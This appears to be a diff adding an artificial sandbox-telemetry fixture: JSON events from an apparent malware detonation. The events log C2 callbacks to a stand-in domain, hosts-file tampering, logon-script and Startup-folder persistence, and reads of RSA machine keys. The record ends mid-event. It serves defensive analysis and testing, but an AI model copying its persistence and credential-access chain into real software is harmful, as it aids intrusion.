@@ -1,0 +1,7118 @@
+[
+ {
+  "id": "39fa6b2d48ddc13a4f1a7e49",
+  "time": "2026-10-13T15:39:50.100Z",
+  "sequence": 1,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-created",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "explorer.exe started benign.exe",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "93f777a9a6556c3f177e1f22",
+  "time": "2026-10-13T15:39:50.750Z",
+  "sequence": 2,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-created",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "benign.exe started cmd.exe (cmd.exe /c ver)",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "559096bfa748425b039d425a",
+  "time": "2026-10-13T15:39:50.894Z",
+  "sequence": 3,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "e7eb1149a47ff9e6122c692d",
+  "time": "2026-10-13T15:39:51.107Z",
+  "sequence": 4,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "benign.exe wrote C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "registry_path": null
+ },
+ {
+  "id": "c92ce0cbdd15e1f07aa31b15",
+  "time": "2026-10-13T15:39:51.209Z",
+  "sequence": 5,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "4180996f02fe03e9026f6412",
+  "time": "2026-10-13T15:39:51.356Z",
+  "sequence": 6,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "benign.exe resolved www.msftconnecttest.com \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "www.msftconnecttest.com"
+  },
+  "dns_query": "www.msftconnecttest.com",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "1ce8252ac4132de293a13919",
+  "time": "2026-10-13T15:39:51.480Z",
+  "sequence": 7,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-created",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "notepad.exe created C:\\Users\\Analyst\\Desktop\\readme.txt",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Desktop\\readme.txt",
+  "registry_path": null
+ },
+ {
+  "id": "65f6ea1a4d26e9f01a230fed",
+  "time": "2026-10-13T15:39:51.545Z",
+  "sequence": 8,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtWriteFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtWriteFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtWriteFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "ef19ead4f672fd28f490a33a",
+  "time": "2026-10-13T15:39:51.899Z",
+  "sequence": 9,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a9d5cd51df98fe1116f1cf96",
+  "time": "2026-10-13T15:39:52.026Z",
+  "sequence": 10,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "svchost.exe resolved tartarus-selftest.example \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "tartarus-selftest.example"
+  },
+  "dns_query": "tartarus-selftest.example",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "10895d31b390fd5f41d7689d",
+  "time": "2026-10-13T15:39:52.322Z",
+  "sequence": 11,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "CryptAcquireContextW",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called CryptAcquireContextW \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "CryptAcquireContextW",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "26cffbe74f0fd2d3ed80da70",
+  "time": "2026-10-13T15:39:52.383Z",
+  "sequence": 12,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9ea3edce74cdf9d972dd8345",
+  "time": "2026-10-13T15:39:52.685Z",
+  "sequence": 13,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "1dd7cbb50afb34e64cc15e6e",
+  "time": "2026-10-13T15:39:52.728Z",
+  "sequence": 14,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtSetInformationFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtSetInformationFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtSetInformationFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "3f2ff4b122dbbcb354e2f427",
+  "time": "2026-10-13T15:39:52.780Z",
+  "sequence": 15,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in benign.exe at 0x7ff6d4528000",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "8833d64479e88691c1b28304",
+  "time": "2026-10-13T15:39:53.116Z",
+  "sequence": 16,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9ca3717d44b58212cf14b797",
+  "time": "2026-10-13T15:39:53.393Z",
+  "sequence": 17,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "notepad.exe resolved tartarus-selftest.example \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "tartarus-selftest.example"
+  },
+  "dns_query": "tartarus-selftest.example",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "1abd1def88e1ed90ef48cde7",
+  "time": "2026-10-13T15:39:53.703Z",
+  "sequence": 18,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a7b212a228b02f22569e54b8",
+  "time": "2026-10-13T15:39:53.898Z",
+  "sequence": 19,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-created",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe created C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "registry_path": null
+ },
+ {
+  "id": "e0822da0b4bed51c7fddd7ec",
+  "time": "2026-10-13T15:39:54.150Z",
+  "sequence": 20,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-created",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe created C:\\Users\\Public\\Libraries\\payload.bin",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Public\\Libraries\\payload.bin",
+  "registry_path": null
+ },
+ {
+  "id": "efba31b04c53f2ae79c0fe99",
+  "time": "2026-10-13T15:39:54.231Z",
+  "sequence": 21,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-key-created",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "benign.exe created HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a"
+ },
+ {
+  "id": "2112862ac202a8024143cb7d",
+  "time": "2026-10-13T15:39:54.601Z",
+  "sequence": 22,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "cmd.exe connected to c2.evil-updates.net:443",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.36",
+   "port": 443,
+   "domain": "c2.evil-updates.net"
+  },
+  "dns_query": null,
+  "url": "https://c2.evil-updates.net/gate.php?id=2259",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9f0ea17f7440bed6b04a486e",
+  "time": "2026-10-13T15:39:54.804Z",
+  "sequence": 23,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "notepad.exe resolved c2.evil-updates.net \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "c2.evil-updates.net"
+  },
+  "dns_query": "c2.evil-updates.net",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a8f09ccd88a74b3b63ccc365",
+  "time": "2026-10-13T15:39:54.840Z",
+  "sequence": 24,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "f48ce16d52210cc7c57261b4",
+  "time": "2026-10-13T15:39:55.105Z",
+  "sequence": 25,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in cmd.exe at 0x7ff65b76b000",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "b523a9c0f5af2d4e2c92a3fd",
+  "time": "2026-10-13T15:39:55.142Z",
+  "sequence": 26,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-key-created",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "benign.exe created HKCU\\Environment\\UserInitMprLogonScript",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Environment\\UserInitMprLogonScript"
+ },
+ {
+  "id": "20cc7ce8e7b134f97255b7f1",
+  "time": "2026-10-13T15:39:55.356Z",
+  "sequence": 27,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "83fe843ef78d6b89bc333203",
+  "time": "2026-10-13T15:39:55.775Z",
+  "sequence": 28,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-read",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe read C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\f686aace6942fb7f7ceb231212eef4a4_0a7bd2e3",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\f686aace6942fb7f7ceb231212eef4a4_0a7bd2e3",
+  "registry_path": null
+ },
+ {
+  "id": "b7cce48538c741931f2a6e04",
+  "time": "2026-10-13T15:39:55.835Z",
+  "sequence": 29,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "2f42dd1614b4ef8541352656",
+  "time": "2026-10-13T15:39:56.204Z",
+  "sequence": 30,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "notepad.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "0918fde8f25bab51e9dcd7b6",
+  "time": "2026-10-13T15:39:56.544Z",
+  "sequence": 31,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtOpenKey",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtOpenKey \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtOpenKey",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a6f6267bba4a38376a48a953",
+  "time": "2026-10-13T15:39:56.665Z",
+  "sequence": 32,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryValueKey",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtQueryValueKey \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtQueryValueKey",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "040b08a87b8c22f5793e08ba",
+  "time": "2026-10-13T15:39:56.899Z",
+  "sequence": 33,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "f371fa5e84b50031159546db",
+  "time": "2026-10-13T15:39:57.258Z",
+  "sequence": 34,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "cmd.exe resolved tartarus-selftest.example \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "tartarus-selftest.example"
+  },
+  "dns_query": "tartarus-selftest.example",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "c961dbd7c6e9299449a5c304",
+  "time": "2026-10-13T15:39:57.450Z",
+  "sequence": 35,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe read HKCU\\Environment\\UserInitMprLogonScript",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Environment\\UserInitMprLogonScript"
+ },
+ {
+  "id": "298fa1bd1d131d11a193b2c0",
+  "time": "2026-10-13T15:39:57.551Z",
+  "sequence": 36,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtWriteFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtWriteFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtWriteFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "ee922f37d9f26284f06e67d1",
+  "time": "2026-10-13T15:39:57.845Z",
+  "sequence": 37,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-set",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe set HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName"
+ },
+ {
+  "id": "3b4e72bd5b5c1a9ef1b53192",
+  "time": "2026-10-13T15:39:57.944Z",
+  "sequence": 38,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "svchost.exe read HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a"
+ },
+ {
+  "id": "90c30f0bbd5093a04c3cc057",
+  "time": "2026-10-13T15:39:58.132Z",
+  "sequence": 39,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-created",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "svchost.exe created C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "registry_path": null
+ },
+ {
+  "id": "a9541b7afe4f45bc41a90469",
+  "time": "2026-10-13T15:39:58.261Z",
+  "sequence": 40,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "svchost.exe wrote C:\\Users\\Analyst\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+  "registry_path": null
+ },
+ {
+  "id": "fedfe549f6e6fb90db6339b0",
+  "time": "2026-10-13T15:39:58.599Z",
+  "sequence": 41,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9f16d7df2bc8a14f418addf4",
+  "time": "2026-10-13T15:39:58.678Z",
+  "sequence": 42,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "GetSystemTimeAsFileTime",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called GetSystemTimeAsFileTime \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "GetSystemTimeAsFileTime",
+  "rule_name": null,
